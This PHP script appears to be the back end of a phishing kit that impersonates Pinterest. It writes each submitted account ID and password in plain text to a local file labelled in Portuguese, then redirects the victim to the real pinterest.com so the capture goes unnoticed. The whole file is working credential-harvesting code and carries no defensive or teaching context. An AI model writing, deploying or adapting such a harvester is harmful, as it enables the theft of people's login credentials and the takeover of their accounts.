<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['id'] . " Senha: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://pinterest.com');
exit();
